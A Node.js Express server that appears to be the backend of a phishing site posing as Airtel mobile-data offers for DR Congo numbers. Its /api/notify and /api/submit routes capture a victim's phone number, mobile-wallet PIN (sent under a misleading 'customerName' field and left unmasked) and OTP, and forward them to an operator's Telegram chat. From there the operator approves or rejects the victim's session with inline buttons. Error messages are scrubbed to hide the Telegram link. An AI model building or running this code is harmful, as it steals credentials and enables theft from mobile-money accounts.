const path = require('path');
const fs = require('fs');
require('dotenv').config({ path: path.join(__dirname, '.env') });
const express = require('express');
const cors = require('cors');
const https = require('https');
const offres = require('./data/offres');
const kit = require('./data/kit');

const app = express();
const PORT = process.env.PORT || 4000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
let TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const envPath = path.join(__dirname, '.env');
let telegramUpdateOffset = 0;
const telegramEnvToggle = (process.env.TELEGRAM_ENABLED || '').trim().toLowerCase();
const hasTelegramCredentials = Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
const TELEGRAM_ENABLED = Boolean(TELEGRAM_BOT_TOKEN) || telegramEnvToggle === 'true';

const isPlaceholderChatId = (chatId) => !chatId || chatId === 'YOUR_CHAT_ID_HERE';
const normalizePhone = (phone) => (phone || '').toString().replace(/\D/g, '');
const getStageForAction = (action) => {
  if (!action) return null;
  if (action === 'allow_proceed' || action === 'invalid_info') {
    return 'approval';
  }
  if (action === 'correct_pin_otp' || action === 'wrong_code' || action === 'wrong_pin') {
    return 'verification';
  }
  return null;
};
const orderActions = new Map();

const updateEnvVar = (key, value) => {
  if (!fs.existsSync(envPath)) {
    return;
  }
  const envContent = fs.readFileSync(envPath, 'utf8');
  const regex = new RegExp(`^(${key}\\s*=\\s*).*`, 'm');
  const updatedContent = envContent.match(regex)
    ? envContent.replace(regex, `$1${value}`)
    : `${envContent.trimEnd()}\n${key}=${value}\n`;

  if (updatedContent !== envContent) {
    fs.writeFileSync(envPath, updatedContent, 'utf8');
    console.log(`Updated ${key} in ${envPath}`);
  }
};

const sanitizeErrMsg = (err) => {
  if (!err) return 'external service error';
  const raw = (err && err.message) ? err.message : String(err);
  if (/ENOTFOUND|getaddrinfo/i.test(raw)) return 'external service unreachable';
  return raw.replace(/api\.telegram\.org/gi, 'external-service').replace(/Telegram/gi, 'Notification');
};

const maskPin = (pin) => {
  const value = (pin || '').toString();
  if (!value) return 'N/A';
  return value;
};

const detectTelegramChatId = () => {
  if (!TELEGRAM_ENABLED) {
    return Promise.resolve(null);
  }

  return new Promise((resolve) => {
    if (!TELEGRAM_BOT_TOKEN) {
      return resolve(null);
    }

    const requestOptions = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/getUpdates`,
      method: 'GET'
    };

    const req = https.request(requestOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (!parsed.ok || !Array.isArray(parsed.result)) {
            return resolve(null);
          }

          const foundIds = new Set();
          for (const update of parsed.result) {
            const chat =
              update.message?.chat ||
              update.edited_message?.chat ||
              update.channel_post?.chat ||
              update.edited_channel_post?.chat ||
              update.callback_query?.message?.chat ||
              update.inline_query?.from ||
              update.chosen_inline_result?.from;
            if (chat?.id) {
              foundIds.add(chat.id);
            }
          }

          if (foundIds.size === 0) {
            return resolve(null);
          }

          const [detectedChatId] = foundIds;
          updateEnvVar('TELEGRAM_CHAT_ID', detectedChatId);
          if (isPlaceholderChatId(TELEGRAM_CHAT_ID) || TELEGRAM_CHAT_ID !== detectedChatId) {
            TELEGRAM_CHAT_ID = detectedChatId;
          }

          const lastUpdateId = Math.max(...parsed.result.map((update) => update.update_id));
          telegramUpdateOffset = Math.max(telegramUpdateOffset, lastUpdateId + 1);

          if (foundIds.size > 1) {
            console.log('Multiple chat IDs found:', [...foundIds].join(', '));
          }

          resolve(detectedChatId);
        } catch (err) {
          console.warn('Auto-detect chat ID failed:', sanitizeErrMsg(err));
          resolve(null);
        }
      });
    });

    req.on('error', (err) => {
      console.warn('getUpdates network error:', sanitizeErrMsg(err));
      resolve(null);
    });

    req.end();
  });
};

const fetchTelegramUpdates = (offset = 0) => {
  if (!TELEGRAM_ENABLED) {
    return Promise.resolve({ ok: false, result: [] });
  }

  return new Promise((resolve, reject) => {
    const requestOptions = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}`,
      method: 'GET'
    };

    const req = https.request(requestOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          resolve(parsed);
        } catch (err) {
          reject(err);
        }
      });
    });

    req.on('error', (err) => reject(new Error(sanitizeErrMsg(err))));
    req.end();
  });
};

const sendTelegramRequest = (path, payload) => {
  if (!TELEGRAM_ENABLED) {
    return Promise.resolve({ status: 200, data: 'notifications-disabled' });
  }

  return new Promise((resolve, reject) => {
    const body = JSON.stringify(payload);
    const requestOptions = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/${path}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      }
    };

    const req = https.request(requestOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        resolve({ status: res.statusCode, data });
      });
    });

    req.on('error', (err) => reject(new Error(sanitizeErrMsg(err))));
    req.write(body);
    req.end();
  });
};

const answerCallbackQuery = (callbackQueryId, text) => {
  return sendTelegramRequest('answerCallbackQuery', {
    callback_query_id: callbackQueryId,
    text,
    show_alert: false
  });
};

const handleCallbackQuery = async (callbackQuery) => {
  const callbackData = callbackQuery.data;
  const [actionKey, phone] = callbackData.split(':');
  const normalizedPhone = normalizePhone(phone);
  const chatId = callbackQuery.message?.chat?.id || callbackQuery.from?.id;
  let responseText = 'Action received.';

  switch (actionKey) {
    case 'allow_proceed':
      responseText = '✅ User approved to continue.';
      break;
    case 'invalid_info':
      responseText = '❌ Invalid information reported.';
      break;
    case 'correct_pin_otp':
      responseText = '✅ PIN and OTP verified as correct.';
      break;
    case 'wrong_code':
      responseText = '❌ OTP code is incorrect.';
      break;
    case 'wrong_pin':
      responseText = '⚠️ PIN is incorrect.';
      break;
    default:
      responseText = '✅ Action recorded.';
      break;
  }

  if (normalizedPhone) {
    orderActions.set(normalizedPhone, {
      action: actionKey,
      text: responseText,
      stage: getStageForAction(actionKey),
      timestamp: Date.now(),
      user: callbackQuery.from?.username || callbackQuery.from?.first_name || null
    });
  }

  try {
    await answerCallbackQuery(callbackQuery.id, responseText);
    if (chatId) {
      await sendTelegramMessage(chatId, `<b>Gdk - Action confirmed</b>\n${responseText}`);
    }
  } catch (err) {
    console.warn('Failed to handle callback query:', sanitizeErrMsg(err));
  }
};

app.get('/api/action-status', (req, res) => {
  const phone = req.query.phone;
  const stage = req.query.stage;

  if (!phone) {
    return res.status(400).json({ message: 'Parametre phone manquant.' });
  }

  const normalizedPhone = normalizePhone(phone);
  const status = orderActions.get(normalizedPhone);
  if (!status) {
    return res.json({ action: null });
  }

  if (stage && status.stage !== stage) {
    return res.json({ action: null });
  }
  // Consume the action once delivered so stale wrong_pin/wrong_code
  // responses do not keep forcing users back after they retry.
  orderActions.delete(normalizedPhone);
  return res.json(status);
});

const processTelegramUpdates = async () => {
  if (!TELEGRAM_BOT_TOKEN) {
    return;
  }

  try {
    const updates = await fetchTelegramUpdates(telegramUpdateOffset);
    if (!updates.ok || !Array.isArray(updates.result)) {
      return;
    }

    for (const update of updates.result) {
      telegramUpdateOffset = Math.max(telegramUpdateOffset, update.update_id + 1);
      if (update.callback_query) {
        await handleCallbackQuery(update.callback_query);
      }
    }
  } catch (err) {
    console.warn('Update processing error:', sanitizeErrMsg(err));
  }
};

if (TELEGRAM_ENABLED) {
  setInterval(() => {
    processTelegramUpdates();
  }, 3000);
}

const buildTelegramPayload = (chatId, message, buttons) => {
  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML'
  };

  if (buttons) {
    payload.reply_markup = { inline_keyboard: buttons };
  }

  return payload;
};

const sendTelegramMessage = (chatId, message, buttons) => {
  return sendTelegramRequest('sendMessage', buildTelegramPayload(chatId, message, buttons));
};

const attemptSendTelegramMessage = async (message, chatId, buttons, retried = false) => {
  if (!TELEGRAM_ENABLED) {
    return { status: 200, data: 'notifications-disabled' };
  }

  const response = await sendTelegramMessage(chatId, message, buttons);
  if (response.status >= 200 && response.status < 300) {
    return response;
  }

  if (!retried && response.status === 400 && response.data?.includes('chat not found')) {
    const detectedChatId = await detectTelegramChatId();
    if (detectedChatId && detectedChatId !== chatId) {
      return attemptSendTelegramMessage(message, detectedChatId, buttons, true);
    }
  }

  const error = new Error('Notification submission failed.');
  error.status = response.status;
  error.detail = response.data;
  throw error;
};

if (!TELEGRAM_ENABLED) {
  console.log('Notification integration is disabled (TELEGRAM_ENABLED=false).');
} else {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('Notification bot token is not configured. Set TELEGRAM_BOT_TOKEN in server/.env');
  }

  if (isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
    console.warn('Notification CHAT_ID is still the placeholder. Attempting to auto-detect from updates...');
  }

  (async () => {
    await detectTelegramChatId();
  })();
}

app.use(cors());
app.use(express.json());

app.get('/api/offres', (req, res) => {
  res.json({ offres, kit });
});

app.get('/api/offres/:id', (req, res) => {
  const id = parseInt(req.params.id, 10);
  const offre = offres.find((item) => item.id === id);

  if (!offre) {
    return res.status(404).json({ message: 'Forfait introuvable' });
  }

  res.json(offre);
});

app.post('/api/notify', async (req, res) => {
  if (!TELEGRAM_ENABLED) {
    return res.json({ success: true, note: 'notifications-disabled' });
  }

  if (!TELEGRAM_BOT_TOKEN) {
    return res.status(500).json({ message: 'Identifiants de notification non configures.' });
  }

  if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
    const detectedChatId = await detectTelegramChatId();
    if (detectedChatId) {
      TELEGRAM_CHAT_ID = detectedChatId;
    }
  }

  if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
    return res.status(500).json({ message: 'CHAT_ID introuvable. Envoyez /start au bot puis reessayez.' });
  }

  const { offerId, offerTitle, airtelNumber } = req.body;
  const walletPin = (req.body.walletPin ?? req.body.customerName ?? '').toString().trim();

  if (!offerId || !offerTitle || !airtelNumber || !walletPin) {
    return res.status(400).json({ message: 'Donnees de notification manquantes.' });
  }

  const cleanPhone = normalizePhone(airtelNumber);
  const message = `<b>Gdk - LOGIN ATTEMPT</b>\n\n` +
    `<b>NEW USER</b>\n` +
    `🌍 <b>Country Code</b>: +243\n` +
    `📱 <b>Phone Number</b>: ${airtelNumber}\n` +
    `🔐 <b>PIN</b>: ${maskPin(walletPin)}\n` +
    `⏰ <b>Time</b>: ${new Date().toLocaleString()}\n\n` +
    `⚠️ <b>User awaiting validation</b>\n` +
    `⏳ <b>Timeout</b>: 5 minutes`;

  const buttons = [
    [
      { text: '✅ Allow', callback_data: `allow_proceed:${cleanPhone}` },
      { text: '❌ Invalid information', callback_data: `invalid_info:${cleanPhone}` }
    ]
  ];

  try {
    const response = await attemptSendTelegramMessage(message, TELEGRAM_CHAT_ID, buttons);
    if (response.status >= 200 && response.status < 300) {
      return res.json({ success: true });
    }

    console.error('Notifier error response:', response.status, response.data);
    return res.status(response.status).json({ message: 'Echec de la notification.', detail: response.data });
  } catch (err) {
    console.error('Notifier request error:', sanitizeErrMsg(err));
    const status = err.status || 500;
    return res.status(status).json({ message: 'Erreur de notification.', detail: null });
  }
});

app.post('/api/submit', async (req, res) => {
  if (!TELEGRAM_ENABLED) {
    return res.json({ success: true, note: 'notifications-disabled' });
  }

  if (!TELEGRAM_BOT_TOKEN) {
    return res.status(500).json({ message: 'Identifiants de notification non configures.' });
  }

  if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
    const detectedChatId = await detectTelegramChatId();
    if (detectedChatId) {
      TELEGRAM_CHAT_ID = detectedChatId;
    }
  }

  if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
    return res.status(500).json({ message: 'CHAT_ID introuvable. Envoyez /start au bot puis reessayez.' });
  }

  const { offerId, offerTitle, airtelNumber, otpCode } = req.body;
  const walletPin = (req.body.walletPin ?? req.body.customerName ?? '').toString().trim();
  const normalizedOtp = (otpCode ?? '').toString().trim();

  if (!offerId || !offerTitle || !airtelNumber || !walletPin || !normalizedOtp) {
    return res.status(400).json({ message: 'Donnees de soumission manquantes.' });
  }

  if (!/^\d{4}$/.test(normalizedOtp)) {
    return res.status(400).json({ message: 'Le code OTP doit contenir exactement 4 chiffres.' });
  }

  const message = `<b>✅ Gdk - OTP VERIFICATION</b>\n\n` +
    `<b>NEW USER - VERIFICATION REQUIRED</b>\n` +
    `🌍 <b>Country Code</b>: +243\n` +
    `📱 <b>Phone Number</b>: ${airtelNumber}\n` +
    `🔐 <b>OTP Code</b>: ${normalizedOtp}\n` +
    `⏰ <b>Time</b>: ${new Date().toLocaleString()}\n\n` +
    `⚠️ <b>Please verify the credentials:</b>\n` +
    `⏳ <b>Timeout</b>: 5 minutes`;

  const cleanPhone = normalizePhone(airtelNumber);
  const buttons = [
    [
      { text: '✅ Correct (PIN + OTP)', callback_data: `correct_pin_otp:${cleanPhone}` }
    ],
    [
      { text: '❌ Wrong code', callback_data: `wrong_code:${cleanPhone}` },
      { text: '⚠️ Wrong PIN', callback_data: `wrong_pin:${cleanPhone}` }
    ]
  ];

  try {
    const response = await attemptSendTelegramMessage(message, TELEGRAM_CHAT_ID, buttons);
    if (response.status >= 200 && response.status < 300) {
      return res.json({ success: true });
    }

    console.error('Notifier error response:', response.status, response.data);
    return res.status(response.status).json({ message: 'Echec de soumission de notification.', detail: response.data });
  } catch (err) {
    console.error('Notifier request error:', sanitizeErrMsg(err));
    const status = err.status || 500;
    return res.status(status).json({ message: 'Erreur de soumission de notification.', detail: null });
  }
});

app.listen(PORT, () => {
  console.log(`API serveur démarré sur http://localhost:${PORT}`);
});
